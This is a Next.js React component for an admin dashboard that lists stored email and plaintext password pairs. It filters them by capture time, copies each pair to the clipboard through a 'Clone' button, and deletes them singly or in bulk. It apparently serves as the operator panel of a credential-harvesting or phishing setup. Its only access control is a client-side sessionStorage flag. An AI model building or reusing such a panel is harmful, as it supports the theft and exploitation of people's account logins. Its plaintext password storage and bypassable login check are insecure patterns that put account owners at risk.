'use client';
import axios from 'axios';
import React, { useEffect, useState } from 'react';
import bin from '@/images/bin.png';
import copy from '@/images/copy.png'
import { useRouter } from 'next/navigation';

const page = () => {

    const [selectedIds, setSelectedIds] = useState([]);
    const [filter, setFilter] = useState('');
    const [formData, setFormData] = useState([]);

    const fetchData = async (filter) => {
        const response = await axios.get('http://localhost:5000/api/data', {
          params: { filter },
        });
        setFormData(response.data);
      };

    
      useEffect(() => {
        fetchData(filter);
      }, [filter]);


      const handleDelete = async (id) => {
        await axios.delete(`http://localhost:5000/api/delete/${id}`);
        fetchData(filter); // Refresh the data on the dashboard
      };
    
      const handleCopy = (email, password) => {
        navigator.clipboard.writeText(`Email: ${email}, Password: ${password}`);
        alert('Copied to clipboard');
      };
    
      const toggleSelectAll = (e) => {
        if (e.target.checked) {
          const allIds = formData.map((data) => data._id);
          setSelectedIds(allIds);
        } else {
          setSelectedIds([]);
        }
      };


      const handleCheckboxChange = (id) => {
        if (selectedIds.includes(id)) {
          setSelectedIds(selectedIds.filter((selectedId) => selectedId !== id));
        } else {
          setSelectedIds([...selectedIds, id]);
        }
      };

      const handleDeleteAll = async () => {
        for (let id of selectedIds) {
          await axios.delete(`http://localhost:5000/api/delete/${id}`);
        }
        fetchData(filter); // Refresh data after deletion
        setSelectedIds([]); // Reset selection
      };



      const router = useRouter();

      useEffect(() => {
        if (sessionStorage.getItem('isLoggedIn') !== 'true') {
          router.push('/Admin_Login');
        }else{
            // document.location.reload();
        }
      }, [router]);

    return (
        <div className='p-5'>

       

         

          <section className='flex justify-between px-2'>
          <div className='flex items-center justify-center gap-3 '>
          <h2 className='text-[20px] font-bold'>Dashboard</h2>
          {selectedIds.length === formData.length && formData.length > 0 && (
            <button onClick={handleDeleteAll} className='px-2 text-white bg-gray-700 rounded'>
          Delete All
            </button>
      )}
          </div>
          <div>
        {/* <label>Filter by time range: </label> */}
        <select className='p-2 outline-none text-[14px]' value={filter} onChange={(e) => setFilter(e.target.value)}>
          <option value="">All</option>
          <option value="today">Today</option>
          <option value="week">This Week</option>
          <option value="month">This Month</option>
        </select>
        </div>
          </section>


        
      <div class="flex flex-col p-2">
  <div class="-m-1.5 overflow-x-auto">
    <div class="p-1.5 min-w-full inline-block align-middle">
      <div class="border rounded-lg divide-y divide-gray-200 dark:border-gray-700 dark:divide-gray-700">
        <div class="overflow-hidden">
          <table class="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
            <thead class="bg-gray-50 dark:bg-gray-700">
              <tr>
                <th scope="col" class="py-3 px-4 pe-0">
                  <div class="flex items-center h-5">
                    <input id="hs-table-pagination-checkbox-all" type="checkbox" onChange={toggleSelectAll} checked={selectedIds.length === formData.length && formData.length > 0} class="border-gray-200 rounded text-blue-600 focus:ring-blue-500 dark:bg-gray-800 dark:border-gray-700 dark:checked:bg-blue-500 dark:checked:border-blue-500 dark:focus:ring-offset-gray-800"/>
                    <label for="hs-table-pagination-checkbox-all" class="sr-only">Checkbox</label>
                  </div>
                </th>
                <th scope="col" class="px-6 py-3 text-start text-xs font-medium text-white uppercase">Email & Password</th>
                
                
                <th scope="col" class="px-6 py-3 text-end text-xs font-medium text-white uppercase">
                    <span className='px-[40px]'>Copy</span>
                    <span className='px-7'>Delete</span>
                </th>
              </tr>
            </thead>

         


            <tbody class="divide-y divide-gray-200 dark:divide-gray-700">

          

            {

formData.length === 0 ? (
    <tr>
      <td colSpan="4" style={{ textAlign: 'center', padding: '20px' }}>
        No data available
      </td>
    </tr>):

                formData.map((data)=> (
                    <tr key={data._id}>
                    <td class="py-3 ps-4">
                      <div class="flex items-center h-5">
                        <input id="hs-table-pagination-checkbox-1" type="checkbox" checked={selectedIds.includes(data._id)} onChange={()=>handleCheckboxChange(data._id)} class="border-gray-200 rounded text-blue-600 focus:ring-blue-500 dark:bg-gray-800 dark:border-gray-700 dark:checked:bg-blue-500 dark:checked:border-blue-500 dark:focus:ring-offset-gray-800"/>
                        <label for="hs-table-pagination-checkbox-1" class="sr-only">Checkbox</label>
                      </div>
                    </td>
                    <td class="px-6 py-4 whitespace-nowrap text-sm text-black ">
                        <span>Email : {data.email}</span> <br />
                        <span>Password : {data.password}</span>
                    </td>
                    
                    <td class="px-6 py-4 whitespace-nowrap text-sm text-black text-end">
                        <span onClick={() => handleCopy(data.email, data.password)} className='px-10 cursor-pointer'>Clone</span>
                        <span onClick={() => handleDelete(data._id)} className='px-10 cursor-pointer'>❌</span>
                    </td>
                   
                  </tr>
                ))
            }

             

              
             

              
        
             
            </tbody>
          </table>
        </div>
        
      </div>
    </div>
  </div>
</div>














        </div>
    );
};


  

export default page;